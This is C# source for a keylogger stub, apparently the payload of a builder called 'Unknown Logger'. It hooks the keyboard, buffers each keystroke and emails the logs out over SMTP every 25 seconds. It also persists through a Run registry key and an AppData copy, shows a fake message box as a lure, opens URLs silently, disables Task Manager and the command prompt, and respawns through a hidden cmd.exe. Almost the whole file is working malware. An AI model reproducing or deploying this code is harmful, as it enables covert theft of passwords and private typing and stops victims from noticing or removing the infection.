using System;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using UnknownLibrary.Keyhook;
using UnknownLibrary.SMTP;
using Microsoft.Win32;
using System.Diagnostics;
using System.IO;
using UnknownLibrary.FakeMessageBox;

namespace Unknown_Stub
{
    class Program
    {
        #region Variables 


        internal static string EMailTo, EMailFrom, EMailPassword, SMTPServer, SMTPPort,
        Subject = "Unknown Logger logs " + EMailCount, CustomStoreFolder = "\\WinActive\\", SiteVisitorURL, RegistryPath = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
        internal static bool IsTicking;
        internal static int EMailCount = 0;
        static int SendInterval = 25000;
        static System.Windows.Forms.Timer KeystrokeTimer = new System.Windows.Forms.Timer();
        internal static LowLevelKeyboardListener Listener = new LowLevelKeyboardListener();
        public static StringBuilder KeystrokeLogs = new StringBuilder();

        static string FakeMessageBoxName, FakeMessageBoxText, FakeMessageBoxOption, FakeMessageBoxIcon, ApplicationName;
        #endregion
        #region TimerVoids
        static void KeystrokeTimer_Tick(object sender, EventArgs e)
        {
            IsTicking = false;
            KeystrokeTimer.Enabled = false;
            LowLevelKeyhookListener();
        }
        #endregion
        #region SMTP
        internal static void EMailKeystrokes(string Keystrokes)
        {
            try
            {
                EMailCount++;
                SMTP.SendMail(EMailFrom, EMailTo, Variables.SMTPServer, Variables.SMTPPort, EMailPassword, Subject, Keystrokes);
            }
            catch (Exception)
            {
                System.Threading.Thread.Sleep(25000);
                EMailKeystrokes(Convert.ToString(KeystrokeLogs));
            }
        }

        #endregion
        #region DLLImports
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);


        [DllImport("Kernel32")]
        private static extern bool SetConsoleCtrlHandler(EventHandler handler, bool add);

        static int SW_HIDE = 0;
        static int SW_SHOW = 5;

        #endregion
        #region IfConsoleCloses
        private delegate bool EventHandler(CtrlType sig);
        static EventHandler _handler;
        enum CtrlType
        {
            CTRL_C_EVENT = 0,
            CTRL_BREAK_EVENT = 1,
            CTRL_CLOSE_EVENT = 2,
            CTRL_LOGOFF_EVENT = 5,
            CTRL_SHUTDOWN_EVENT = 6
        }

        private static bool Handler(CtrlType sig)
        {
            Listener.UnHookKeyboard();
            return false;
        }
        #endregion

        static void Main(string[] args)
        { 
            #region IfConsoleCloses
            _handler += new EventHandler(Handler);
            SetConsoleCtrlHandler(_handler, true);
            #endregion
            #region Initialize
            InitializeTimer();
            #endregion
            #region LogKeystrokes
            KeystrokeTimer.Tick += KeystrokeTimer_Tick;
            Listener.HookKeyboard();
            LowLevelKeyhookListener();
            Application.Run();
            #endregion

            #region FakeMessageBox
            if (Variables.FakeMessageBox)
            {
                FakeMessageBoxCreator.createMessageBox(FakeMessageBoxOption, FakeMessageBoxText, FakeMessageBoxName, FakeMessageBoxIcon);
            }
            #endregion
            #region MoveToAppDataAndAddToStartup
            if (Variables.AddToStartup)
            {
                string exePath = Application.ExecutablePath;
                string copyPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                copyPath += CustomStoreFolder + Path.GetFileName(exePath);

                if (!File.Exists(copyPath) && !exePath.EndsWith("ve.exe"))
                {
                    File.Copy(exePath, copyPath);
                    #region AddToStartup
                    RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    add.SetValue(ApplicationName, "\"" + Application.ExecutablePath.ToString() + "\"");
                }
                #endregion
            }
            #endregion
            #region SiteVisitor
            if (Variables.SiteVisitor)
            {
                if (!Variables.SilentSiteVisitor)
                {
                    Process.Start(SiteVisitorURL);
                }
                else
                {
                    ProcessStartInfo OpenSite = new ProcessStartInfo()
                    {
                        UseShellExecute = false,
                        FileName = SiteVisitorURL
                    };
                    Process Open = Process.Start(OpenSite);
                }
            }
            #endregion
            #region DisableTaskMger
            if (Variables.DisableTaskManager)
            {
                DisableOrEnableApp("DisableTaskMgr", RegistryPath, false);
            }
            #endregion
            #region DisableCMD
            if (Variables.DisableCMD)
            {
                DisableOrEnableApp("DisableCMD", RegistryPath, false);
            }
            #endregion

        }

        #region LowLevelListenerVoid

        private static void LowLevelKeyhookListener()
        {
            if (IsTicking)
            {
                Listener.OnKeyPressed += _listener_OnKeyPressed;
            }
            else
            {
                try
                {
                    EMailKeystrokes(Convert.ToString(KeystrokeLogs));
                    KeystrokeLogs.Clear();
                }
                catch (Exception)
                {
                    System.Threading.Thread.Sleep(25000);
                    EMailKeystrokes(Convert.ToString(KeystrokeLogs));
                    KeystrokeLogs.Clear();
                }
            }
            InitializeTimer();
        }
        #endregion
        #region InitializeTimer
        static void InitializeTimer()
        {

            KeystrokeTimer.Interval = SendInterval;
            IsTicking = true;
            KeystrokeTimer.Enabled = true;
            KeystrokeTimer.Start();
        }
        #endregion
        #region LowLevelListenerVoid
        static void _listener_OnKeyPressed(object sender, KeyPressedArgs e)
        {
            bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
            if (CapsLock)
            {
                KeystrokeLogs.Append(e.KeyPressed.ToString().ToUpper());
            }
            else
            {
                KeystrokeLogs.Append(e.KeyPressed.ToString().ToLower());
            }

        }
        #endregion
        #region DisableOrEnableApplication

        static void DisableOrEnableApp(string Application, string RegistryPath, bool enable)
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                RegistryPath);
            if (enable && objRegistryKey.GetValue(Application) != null)
                objRegistryKey.DeleteValue(Application);
            else
                objRegistryKey.SetValue(Application, "1");
            objRegistryKey.Close();
        }
        #endregion
        #region Respawner
        private void StubForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (Variables.Respawner)
            {
                ProcessStartInfo Info = new ProcessStartInfo();
                Info.Arguments = "/C ping 127.0.0.1 -n 2 && \"" + Application.ExecutablePath + "\"";
                Info.WindowStyle = ProcessWindowStyle.Hidden;
                Info.CreateNoWindow = true;
                Info.FileName = "cmd.exe";
                Process.Start(Info);
                Application.Exit();
            }
        }
        #endregion
    }
}
